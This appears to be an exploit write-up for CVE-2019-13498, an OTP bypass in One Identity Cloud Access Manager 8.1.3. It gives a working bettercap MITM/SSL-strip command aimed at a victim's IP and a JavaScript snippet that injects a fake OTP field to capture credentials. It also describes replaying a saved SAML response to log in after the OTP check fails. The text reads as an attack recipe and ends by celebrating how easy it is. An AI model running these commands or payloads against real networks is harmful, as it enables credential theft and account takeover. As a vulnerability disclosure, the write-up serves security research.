# CVE-2019-13498

Exploit Title:  OTP bypass (Filed Integrity check)<br>
Date: 07/10/2019<br>
Exploit Author: Furqan Khan<br>
Vendor Homepage: https://www.oneidentity.com/<br>
Software Link: https://www.oneidentity.com/products/cloud-access-manager/<br>
Version: 8.1.3<br>
Tested on: Kali Linux , Windows 7 ,Ubantu 16.04<br>

####  To exploit the OPT bypass vulnerability , an attacker , conducts a MITM / SSL strip attack using which he can inject a OTP text box into the web page which is being served to the victim (ideally this text box appears at second page of authentication , after providing username and password).A victim shares his username ,password and OTP generated form a app called as defender(which is owned by same vendor) which attacker intercepts and the same to access the application via a legitimate workflow. After putting username and password (which were stolen) , the attacker puts the stolen OTP at next page. when submitting the request at OTP page the signed SAML response is saved.Now even tough attacker doesn't have access over the app that generates OTP , he can put invalid otp for successive transactions and while the application invalidates the OTP , the attacker can change the failed SAML response with earlier obtained legitimate SAML response , and the application logs the attacker in.


# The bettercap command used is :
##### bettercap -T 192.168.1.103 --proxy -P post --proxy-module injectjs --js-file inject_js.js ####

![bettercap.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/1.PNG)

Here 192.168.1.103 is the IP address of the victim. If we do not know it , we can use bettercap , to sniff and maupulate content of the entire LAN (common network of attacker and victim)

## The content of inject_js.js is given as under ##

```html
<script>
 
function replace_payload()
{  


     var append_str='<div class="wrap-input100 validate-input m-b-20" data-validate="Password"><input class="cui-textbox" type="password"  id="passwordTextbox" name="passwordTextbox"><span class="focus-cui-textbox" data-placeholder="OTP"></span></div>';

     var text_div=$(".m-b-20");

     text_div.append(append_str);

    }

    function control(){setTimeout(replace_payload,2000);} control();
    
</script>
```
##### Now when the victim would browse the product (Cloud access manager) , due to cache piosining and SSL strip (Bettercap) ,an OTP text box will be injected in the page that would be served to victim via the injected javascript snippet #####
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/2.PNG)

##### Given that the connection is downgraded to http via ssl-strip , now all traffic shall be visible to the attacker.Thus we can intercept the traffic , and see the username , password and OTP submitted by victim. #####

![intercept.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/3.PNG)

#####  Bingo ! That was easy ! #####
